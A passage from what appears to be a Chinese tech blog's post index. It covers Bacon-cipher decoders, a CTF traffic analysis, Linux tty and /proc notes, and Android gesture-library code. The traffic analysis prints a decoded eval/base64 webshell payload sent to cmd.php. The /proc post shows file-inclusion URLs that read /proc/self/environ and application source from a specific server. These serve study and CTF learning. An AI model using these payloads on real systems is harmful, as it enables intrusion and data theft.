大写字母转为B&#x27;To_A=re.sub(r&#x27;[A-Z]&#x27;,&#x27;B&#x27;,raw)To_B=re.sub(r&#x27;[a-z]&#x27;,&#x27;A&#x27;,To_A)print(To_B)# sub，替换匹配成功的指定位置字符串#sub(pattern, repl, string, count=0, flags=0)# pattern： 正则模型# repl ： 要替换的字符串或可执行对象# string ： 要匹配的字符串# count ： 指定匹配个数# flags ： 匹配模式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263letters1 = [ &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;,]letters2 = [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;,]cipher1 = [ &quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaab&quot;, &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;, &quot;bbaaa&quot;, &quot;bbaab&quot;,]cipher2 = [ &quot;AAAAA&quot;, &quot;AAAAB&quot;, &quot;AAABA&quot;, &quot;AAABB&quot;, &quot;AABAA&quot;, &quot;AABAB&quot;, &quot;AABBA&quot;, &quot;AABBB&quot;, &quot;ABAAA&quot;, &quot;ABAAA&quot;, &quot;ABAAB&quot;, &quot;ABABA&quot;, &quot;ABABB&quot;, &quot;ABBAA&quot;, &quot;ABBAB&quot;, &quot;ABBBA&quot;, &quot;ABBBB&quot;, &quot;BAAAA&quot;, &quot;BAAAB&quot;, &quot;BAABA&quot;, &quot;BAABB&quot;, &quot;BAABB&quot;, &quot;BABAA&quot;, &quot;BABAB&quot;, &quot;BABBA&quot;, &quot;BABBB&quot;,]def bacon1(string): lists = [] # 分割，五个一组 for i in range(0, len(string), 5): lists.append(string[i:i+5]) # print(lists) # 循环匹配，得到下标，对应下标即可 for i in range(0, len(lists)): for j in range(0, 26): if lists[i] == cipher1[j]: # print(j) print(letters1[j], end=&quot;&quot;) print(&quot;&quot;)def bacon2(string): lists = [] # 分割，五个一组 for i in range(0, len(string), 5): lists.append(string[i:i+5]) # print(lists) # 循环匹配，得到下标，对应下标即可 for i in range(0, len(lists)): for j in range(0, 26): if lists[i] == cipher2[j]: # print(j) print(letters2[j], end=&quot;&quot;) print(&quot;&quot;)if __name__ == &quot;__main__&quot;: bcon1=input(&#x27;ab 输入: &#x27;) bacon1(bcon1) bcon2=input(&#x27;AB 输入: &#x27;) bacon2(bcon2) 123456789101112131415161718192021222324252627282930import re# 培根加密有两种class Baconian(): alphabet = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;] first_cipher = [&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaab&quot;, &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;, &quot;bbaaa&quot;, &quot;bbaab&quot;] second_cipher = [&quot;aaaaa&quot;, &quot;aaaab&quot;, &quot;aaaba&quot;, &quot;aaabb&quot;, &quot;aabaa&quot;, &quot;aabab&quot;, &quot;aabba&quot;, &quot;aabbb&quot;, &quot;abaaa&quot;, &quot;abaaa&quot;, &quot;abaab&quot;, &quot;ababa&quot;, &quot;ababb&quot;, &quot;abbaa&quot;, &quot;abbab&quot;, &quot;abbba&quot;, &quot;abbbb&quot;, &quot;baaaa&quot;, &quot;baaab&quot;, &quot;baaba&quot;, &quot;baabb&quot;, &quot;baabb&quot;, &quot;babaa&quot;, &quot;babab&quot;, &quot;babba&quot;, &quot;babbb&quot;] def __init__(self, str): self.str = str def decode(self): str = self.str.lower() str_array = re.findall(&quot;.&#123;5&#125;&quot;, str) decode_str1 = &quot;&quot; decode_str2 = &quot;&quot; for key in str_array: for i in range(0,26): if key == Baconian.first_cipher[i]: decode_str1 += Baconian.alphabet[i] if key == Baconian.second_cipher[i]: decode_str2 += Baconian.alphabet[i] print(decode_str1) print(decode_str2)if __name__ == &#x27;__main__&#x27;: str = &#x27;aaaabaaaaaaaabaabbbaabbabaabaaaaaaabaababbaaa&#x27; bacon = Baconian(str) bacon.decode() 流量分析 查看一下http流,发现非常多的http请求,看得出是在进行目录爆破,那就查看哪个目录爆破成功,爆破成功返回200，但是流太多，所以先搜了一下可疑内容http contains &quot;cmd&quot; 然后打开搜寻出现的流量，过滤掉一些无用的流量后，在tcp.stream eq 76发现了一个请求成功的php: cmd.php，直接过滤掉请求失败的http contains &quot;200&quot;在tcp.stream eq 1128看到了命令执行过程: tcp.stream eq 1354 unicode解码看一下: 123&gt;&gt;&gt; from urllib import parse&gt;&gt;&gt; parse.unquote(r&#x27;sdnisc=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8%3D&#x27;)&#x27;sdnisc=@eval\\x01(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8=&#x27; 将z0的内容解码并排版: 123456789101112131415161718192021222324252627@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL) &#123; echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125; else &#123; $M=NULL; $L=NULL; while($N=@readdir($F)) &#123; //遍历目录文件 $P=$D.&quot;/&quot;.$N; $T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P)); @$E=substr(base_convert(@fileperms($P),10,8),-4); //查看文件名称和权限 $R=&quot;\\t&quot;.$T.&quot;\\t&quot;.@filesize($P).&quot;\\t&quot;.$E.&quot;&quot;; if(@is_dir($P))$M.=$N.&quot;/&quot;.$R; else $L.=$N.$R; &#125; echo $M.$L; @closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die();�R�f&quot;�wwr��F��"},{"title":"Linux没有最小化","date":"2019-12-02","updated":"2024-03-19","path":"2019/12/02/Linux没有最小化/","text":"按alt+F2打开命令窗口，输入gnome-tweaks(Fedora)/gnome-tweak-tool(Debian)，选择左侧窗口标题栏，将最大化、最小化打开。"},{"title":"文本图制作ASCIIFlow","date":"2019-12-02","updated":"2024-03-19","path":"2019/12/02/文本图制作ASCIIFlow/","text":"在线绘画"},{"title":"Linux的dev目录填坑","date":"2019-12-02","updated":"2024-03-19","path":"2019/12/02/Linux的dev目录填坑/","text":"Linux TTY/PTS概述 1 当前控制终端（/dev/tty） /dev/tty指的是当前所处的终端,输出到此的内容只会显示在当前工作的终端显示器上;可以使用命令”ps –ax”来查看进程与哪个控制终端相连.对于你登录的shell， /dev/tty就是你使用的终端，设备号是(5,0). 使用命令”tty”可以查看自己具体对应哪个实际终端设备./dev/tty有些类似于到实际所使用终端设备的一个联接 2./dev/pts /dev/pts是远程登陆(telnet,ssh等)后创建的控制台设备文件所在的目录。由于可能有好几千个用户登陆，所以/dev/pts其实是动态生成的，不象其他设备文件是构建系统时就已经产生的硬盘节点. 3.控制台终端-系统控制台(/dev/console 和 /dev/tty*) 在Linux系统中，计算机显示器通常被称为控制台终端(Console).它仿真了类型为Linux的一种终端(TERM=Linux)，并且有一些设备特殊文件与之相关联： tty0、tty1、tty2等.当你在控制台上登录时，使用的是tty1.使用Alt+[F1—F6]组合键时，我们就可以切换到tty2、tty3等上面去.tty1–tty6等称为虚拟终端， 而tty0则是当前所使用虚拟终端的一个别名，系统所产生的信息会发送到该终端上.因此不管当前正在使用哪个虚拟终端，系统信息都会发送到控制台终端上. 你可以登录到不同的虚拟终端上去，因而可以让系统同时有几个不同的会话期存在.只有系统或超级用户root可以向/dev/tty0进行写操作. 123456789101112131415161718192021222324252627#先用tty命令看看当前bash关联到了哪个ttyroot@kali:/dev/pts# tty/dev/pts/0#看tty都被哪些进程打开了root@kali:/dev/pts# lsof /dev/pts/0COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEzsh 4710 root 0u CHR 136,0 0t0 3 /dev/pts/0zsh 4710 root 1u CHR 136,0 0t0 3 /dev/pts/0zsh 4710 root 2u CHR 136,0 0t0 3 /dev/pts/0zsh 4710 root 10u CHR 136,0 0t0 3 /dev/pts/0bash 10662 root 0u CHR 136,0 0t0 3 /dev/pts/0bash 10662 root 1u CHR 136,0 0t0 3 /dev/pts/0bash 10662 root 2u CHR 136,0 0t0 3 /dev/pts/0bash 10662 root 255u CHR 136,0 0t0 3 /dev/pts/0lsof 10752 root 0u CHR 136,0 0t0 3 /dev/pts/0lsof 10752 root 1u CHR 136,0 0t0 3 /dev/pts/0lsof 10752 root 2u CHR 136,0 0t0 3 /dev/pts/0#往tty里面直接写数据跟写标准输出是一样的效果root@kali:/dev/pts# echo asd&gt; /dev/pts/2root@kali:/dev/pts# echo asd&gt; /dev/pts/2root@kali:/dev/pts# echo asd&gt; /dev/pts/2root@kali:/dev/pts# echo asd&gt; /dev/pts/0asdroot@kali:/dev/pts# echo asd&gt; /dev/pts/1root@kali:/dev/pts# echo asd&gt; /dev/pts/1 通过上面的lsof可以看出，当前运行的bash和lsof进程的stdin(0u)、stdout(1u)、stderr(2u)都绑定到了这个TTY上。"},{"title":"Linux的proc目录","date":"2019-12-02","updated":"2024-03-19","path":"2019/12/02/Linux的proc目录/","text":"proc被称为虚拟文件系统，它是一个控制中心，可以通过更改其中某些文件改变内核运行状态， 它也是内核提空给我们的查询中心，用户可以通过它查看系统硬件及当前运行的进程信息。 Linux中许多工具的数据来源正是proc目录中的内容，比如lsmod的命令是cat /proc/modules的别名。 /proc目录下常用文件介绍： /proc/loadavg 前三列分别保存最近1分钟，5分钟，及15分钟的平均负载。 /proc/meminfo 当前内存使用信息 /proc/diskstats 磁盘I/O统计信息列表 /proc/net/dev 网络流入流出统计信息 /proc/filesystems 支持的文件系统 /proc/cpuinfo CPU的详细信息 /proc/cmdline 启动时传递至内核的启动参数，通常由grub进行传递 /proc/mounts 系统当前挂在的文件系统 /proc/uptime 系统运行时间 /poc/version 当前运行的内核版本号等信息 进程目录下常用文件介绍 cmdline,保存了当前进程的启动命令,如果这个进程是zombie进程，则这个文件没有任何内容。 先随便启动一个进程，以haroopad为例: 获取进程号 查看proc中相应进程id的cmdline: cwd 执行进程的运行目录,是一个符号链接 exe： exe是一个软链接，指向进程的可执行文件，通过它可以启动当前进程的一个拷贝 打开burpsuite: 综合两个看发现exe指向的是启动程序的环境，第一个haroopad是通过dash命令窗口启动,第二个是java环境启动 environ: 进程包含的环境变量 fd: 包含了进程打开的每一个文件的文件描述符，这些描述符是指向实际文件的符号链接。可以通过它恢复删除的文件 目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符 root : /proc/[pid]/root是进程根目录的符号链接。举例如下： stack : /proc/[pid]/stack显示当前进程的内核调用栈信息，只有内核编译时打开了CONFIG_STACKTRACE编译选项，才会生成这个文件。举例如下： comm: /proc/[pid]/comm包含进程的命令名。 maps 参考 截取一部分ctfwp ctf 源码读取 那么思路应该是利用文件包含进行文件读取了 但是不能进行目录穿越，于是得先知道绝对路径，这里想到之前HCTF的方法： 1http://107.167.188.241/static?file=/proc/self/environ 发现500了，应该是没有权限，换个思路 1http://107.167.188.241/static?file=/proc/self/maps 发现了python路径，但是看到内容 12if filename != &#x27;/home/ctf/web/app/static/test.js&#x27; and filename.find(&#x27;/home/ctf/web/app&#x27;) != -1: return abort(404) 我们没有办法使用这个绝对路径，尝试了一下bypass，例如 1/home/ctf/web_assli3fasdf/././././app 发现也不行，出题人说用了abspath 看来只能想想有没有其他途径读取文件，这里想到如下方法 我们知道 1/proc/[pid]/cwd是进程当前工作目录的符号链接 既然之前的路径无法用，那么我们可以考虑从proc进行读取，如下： 12http://107.167.188.241/static?file=/proc/self/cwd/app/__init__.pyhttp://107.167.188.241/static?file=/proc/self/cwd/app/views.py"},{"title":"Android手势创建与保存","date":"2019-11-26","updated":"2024-03-19","path":"2019/11/26/Android手势创建与保存/","text":"安卓手势创建与保存代码: MainActivity 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229package com.example.gesture;import java.io.File;import java.util.ArrayList;import java.util.Iterator;import java.util.Set;import android.Manifest;import android.app.Activity;import android.app.AlertDialog;import android.app.AlertDialog.Builder;import android.content.DialogInterface;import android.content.DialogInterface.OnClickListener;import android.content.Intent;import android.content.pm.PackageManager;import android.gesture.Gesture;import android.gesture.GestureLibraries;import android.gesture.GestureLibrary;import android.gesture.GestureOverlayView;import android.gesture.GestureOverlayView.OnGesturePerformedListener;import android.graphics.Bitmap;import android.os.Bundle;import android.os.Environment;import android.util.Log;import android.view.Menu;import android.view.MenuItem;import android.view.MenuItem.OnMenuItemClickListener;import android.view.View;import android.widget.EditText;import android.widget.ImageView;import android.widget.Toast;import androidx.core.app.ActivityCompat;public class MainActivity extends Activity implements OnGesturePerformedListener&#123; private GestureOverlayView mDrawGestureView; private static GestureLibrary sStore; // 权限申请 private static final int REQUEST_EXTERNAL_STORAGE = 1; private static String[] PERMISSIONS_STORAGE = &#123; Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE &#125;; public void myPermission() &#123; int permission = ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE); if (permission != PackageManager.PERMISSION_GRANTED) &#123; // We don&#x27;t have permission so prompt the user ActivityCompat.requestPermissions( this, PERMISSIONS_STORAGE, REQUEST_EXTERNAL_STORAGE ); &#125; &#125; /** Called when the activity is first created. */ @Override public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); mDrawGestureView = (GestureOverlayView)findViewById(R.id.gesture); //设置手势可多笔画绘制，默认情况为单笔画绘制 mDrawGestureView.setGestureStrokeType(GestureOverlayView.GESTURE_STROKE_TYPE_MULTIPLE); //设置手势的颜色(蓝色) mDrawGestureView.setGestureColor(gestureColor(R.color.gestureColor)); //设置还没未能形成手势绘制是的颜色(红色) mDrawGestureView.setUncertainGestureColor(gestureColor(R.color.ungestureColor)); //设置手势的粗细 mDrawGestureView.setGestureStrokeWidth(4); /*手势绘制完成后淡出屏幕的时间间隔，即绘制完手指离开屏幕后相隔多长时间手势从屏幕上消失； * 可以理解为手势绘制完成手指离开屏幕后到调用onGesturePerformed的时间间隔 * 默认值为420毫秒，这里设置为0.5秒 */ mDrawGestureView.setFadeOffset(500); //绑定监听器 mDrawGestureView.addOnGesturePerformedListener(this); //创建保存手势的手势库 createStore(); &#125; private void createStore() &#123; File mStoreFile = null; /*判断mStoreFile是为空。 * 判断手机是否插入SD卡，并且应用程序是否具有访问SD卡的权限 */ if (mStoreFile == null &amp;&amp; Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED)) &#123; mStoreFile = new File(Environment.getExternalStorageDirectory(), &quot;mygesture&quot;); Log.d(&quot;gesture&quot;,Environment.getExternalStorageDirectory().getAbsolutePath()); Log.d(&quot;gesture&quot;,&quot;mStore&quot;+mStoreFile.getAbsolutePath()); &#125; if (sStore == null) &#123; /* 另外三种创建保存手势文件的方式如下： //保存手势的文件在手机SD卡中 sStore = GestureLibraries.fromFile(Environment.getExternalStorageDirectory().getAbsolutePath() + &quot;mygesture&quot;); sStore = GestureLibraries.fromPrivateFile(this, Environment.getExternalStorageDirectory().getAbsolutePath + &quot;mygesture&quot;); */ //保存手势的文件在应用程序的res/raw文件下 //sStore = GestureLibraries.fromRawResource(this, R.raw.gestures); sStore = GestureLibraries.fromFile(mStoreFile); &#125; testLoad(); &#125; //测试保存手势的文件是否创建成功 private void testLoad() &#123; if (sStore.load()) &#123; showMessage(&quot;手势文件装载成功&quot;); Log.d(&quot;gesture&quot;,&quot;手势文件转载成功&quot;); // 显示所有手势名称 Iterator&lt;String&gt; value; Log.d(&quot;gesture&quot;,&quot;加载成功&quot;); final Set&lt;String&gt; entries=sStore.getGestureEntries();// 获取所有保存的手势名称 value=entries.iterator(); int i=0; while (value.hasNext())&#123; i=i+1; Log.d(&quot;gesture&quot;,&quot;手势名称:&quot;+value.next()+i); &#125; &#125; else &#123; Log.d(&quot;gesture&quot;,&quot;手势文件转载失败&quot;); showMessage(&quot;手势文件装载失败&quot;); &#125; &#125; public static GestureLibrary getStore() &#123; return sStore; &#125; //手势绘制完成时调用 @Override public void onGesturePerformed(GestureOverlayView overlay, Gesture gesture) &#123; // TODO Auto-generated method stub creatDialog(gesture); &#125; private void creatDialog(final Gesture gesture) &#123; final View dialogView = getLayoutInflater().inflate(R.layout.show_gesture, null); //imageView用于显示绘制的手势 ImageView imageView = (ImageView) dialogView.findViewById(R.id.show); // 调用Gesture的toBitmap方法形成对应手势的位图 final Bitmap bitmap = gesture.toBitmap(128, 128, 10, gestureColor(R.color.showColor)); imageView.setImageBitmap(bitmap); Builder dialogBuider = new AlertDialog.Builder(MainActivity.this); dialogBuider.setView(dialogView); //绑定对话框的确认按钮监听事件 dialogBuider.setPositiveButton( &quot;保存&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; // 获取权限 myPermission(); //获取用户保存手势的名字 //final String name = &quot;Star&quot;; EditText editText = (EditText)dialogView.findViewById(R.id.name); final String name = editText.getText().toString(); //移到确认按钮监听事件里面，不然总是会获得空内容 // 添加手势 sStore.addGesture(name, gesture); // 保存添加的手势 sStore.save(); Log.v(&quot;gesture&quot;,&quot;save&quot;); &#125; &#125;); //绑定对话框的取消按钮监听事件 dialogBuider.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; // TODO Auto-generated method stub &#125; &#125;); //显示对话框 dialogBuider.show(); &#125; private int gestureColor(int resId) &#123; return getResources().getColor(resId); &#125; private void showMessage(String s) &#123; Toast.makeText(this, s, Toast.LENGTH_SHORT).show(); &#125; @Override protected void onDestroy() &#123; // TODO Auto-generated method stub super.onDestroy(); //移除绑定的监听器 mDrawGestureView.removeOnGesturePerformedListener(this); &#125;&#125; activity_main.xml 1234567891011121314151617181920212223242526272829&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;.MainActivity&quot;&gt; &lt;TextView android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;Hello World!&quot; app:layout_constraintBottom_toBottomOf=&quot;parent&quot; app:layout_constraintLeft_toLeftOf=&quot;parent&quot; app:layout_constraintRight_toRightOf=&quot;parent&quot; app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt; &lt;android.gesture.GestureOverlayView android:id=&quot;@+id/gesture&quot; android:layout_width=&quot;fill_parent&quot; android:layout_height=&quot;fill_parent&quot; app:layout_constraintBottom_toBottomOf=&quot;parent&quot; app:layout_constraintLeft_toLeftOf=&quot;parent&quot; app:layout_constraintRight_toRightOf=&quot;parent&quot; app:layout_constraintTop_toTopOf=&quot;parent&quot; &gt;&lt;/android.gesture.GestureOverlayView&gt;&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt; show_gesture.xml 12345678910111213141516171819202122232425262728293031&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;fill_parent&quot; android:layout_height=&quot;fill_parent&quot; android:orientation=&quot;vertical&quot; &gt; &lt;LinearLayout android:orientation=&quot;horizontal&quot; android:layout_width=&quot;fill_parent&quot; android:layout_height=&quot;wrap_content&quot;&gt; &lt;TextView android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginRight=&quot;8dip&quot; android:text=&quot;@string/set_gesture_name&quot;/&gt; &lt;EditText android:id=&quot;@+id/name&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot;/&gt; &lt;/LinearLayout&gt; &lt;ImageView android:id=&quot;@+id/show&quot; android:layout_gravity=&quot;center&quot; android:layout_width=&quot;128dp&quot; android:layout_height=&quot;128dp&quot; android:layout_marginTop=&quot;10dp&quot;/&gt;&lt;/LinearLayout&gt; 生成之后目录在: /storage/emulated/0/mygusture 如果保存之后在这里看不到文件就打开cmd, 输入adb root 然后再来看就出现了"},{"title":"Android文件写入","date":"2019-11-26","updated":"2024-03-19","path":"2019/11/26/Android文件写入/","text":"API 23(6.0)以上的手机需要手动去检测读取权限。并不会自动帮你检测，检测后可以确认是否允许应用可获得读写权限。若手机本身不允许该权限，就不会允许你读写数据，即便你在应用加了读写权限。 以下为手动检测读取权限代码： 12345678910111213141516private static final int REQUEST_EXTERNAL_STORAGE = 1;private static String[] PERMISSIONS_STORAGE = &#123; Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE&#125;;public void myPermission() &#123; int permission = ActivityCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE); if (permission != PackageManager.PERMISSION_GRANTED) &#123; // We don&#x27;t have permission so prompt the user ActivityCompat.requestPermissions( this, PERMISSIONS_STORAGE, REQUEST_EXTERNAL_STORAGE ); &#125;&#125; 只需要在要读写前，调用myPermission()方法。 在清单文件中添加权限： 12&lt;uses-permission android:name=&quot;android.permission.READ_EXTERNAL_STORAGE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;"},{"title":"Android_GestureStore","date":"2019-11-26","updated":"2024-03-19","path":"2019/11/26/Android-GestureStore/","text":"安卓api文档 微软安卓api ​ 在分析源码之前，我们先来看看有关涉及到手势保存和加载源码类之间的关系，如下图： 通过上图可以知道： GestureLibrary为抽象类，ResourceGestureLibrary和FileGestureLibrary均继承它； ResourceGestureLibrary和FileGestureLibrary又作为GestureLibraries的内部类； GestureLibrary类中的save和load方法为抽象方法，它们的具体实现在子类ResourceGestureLibrary和FileGestureLibrary中； 通过上文Demo的介绍，我们知道，要想保持用户绘制的手势，前提是需要通过创建相应的手势库来实现；如下步骤：sStore = GestureLibraries.fromFile(mStoreFile)–&gt;sStore.addGesture(name, gesture)–&gt;sStore.save() Step1: GestureLibraries.fromFile(mStoreFile)： 1234567 public final class GestureLibraries &#123; ... public static GestureLibrary fromFile(File path) &#123; return new FileGestureLibrary(path); &#125; ... &#125; 该方法返回的是FileGestureLibrary对象，FileGestureLibrary为GestureLibraries内部类； FileGestureLibrary类的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657private static class FileGestureLibrary extends GestureLibrary &#123; private final File mPath; public FileGestureLibrary(File path) &#123; mPath = path; &#125; @Override public boolean isReadOnly() &#123; return !mPath.canWrite(); &#125; public boolean save() &#123; if (!mStore.hasChanged()) return true; final File file = mPath; final File parentFile = file.getParentFile(); if (!parentFile.exists()) &#123; if (!parentFile.mkdirs()) &#123; return false; &#125; &#125; boolean result = false; try &#123; //noinspection ResultOfMethodCallIgnored file.createNewFile(); //通过文件输出流保存手势的相关信息 mStore.save(new FileOutputStream(file), true); result = true; &#125; catch (FileNotFoundException e) &#123; Log.d(LOG_TAG, &quot;Could not save the gesture library in &quot; + mPath, e); &#125; catch (IOException e) &#123; Log.d(LOG_TAG, &quot;Could not save the gesture library in &quot; + mPath, e); &#125; return result; &#125; public boolean load() &#123; boolean result = false; final File file = mPath; if (file.exists() &amp;&amp; file.canRead()) &#123; try &#123; mStore.load(new FileInputStream(file), true); result = true; &#125; catch (FileNotFoundException e) &#123; Log.d(LOG_TAG, &quot;Could not load the gesture library from &quot; + mPath, e); &#125; catch (IOException e) &#123; Log.d(LOG_TAG, &quot;Could not load the gesture library from &quot; + mPath, e); &#125; &#125; return result; &#125;&#125; FileGestureLibrary类中的代码实现简介： 1). isReadOnly()：该方法实现判断所创建的保存手势文件是否可读； ​ 2). save()：实现保存手势的重要方法，在该方法中，实例化所创建文件的输出流，然后根据输出流调用GestureStore的save(OutputStream stream, Boolean closeStream)方法，然后将GestureStore得到的有关手势的信息通过输出流写入文件； 3). Load()：该方法实现加载当前已保存手势的文件，当我们需要取出已保存的手势和当前手势进行相似度匹配时，就需要通过手势库加载之前保存的手势文件； Step2: FileGestureLibrary类没有addGesture方法，所以sStore.addGesture(name, gesture)方法的实现应该在它的父类GestureLibrary中，过程如下： 12345private static GestureLibrary sStore;...// 添加手势sStore.addGesture(name, gesture);... 调用过程: 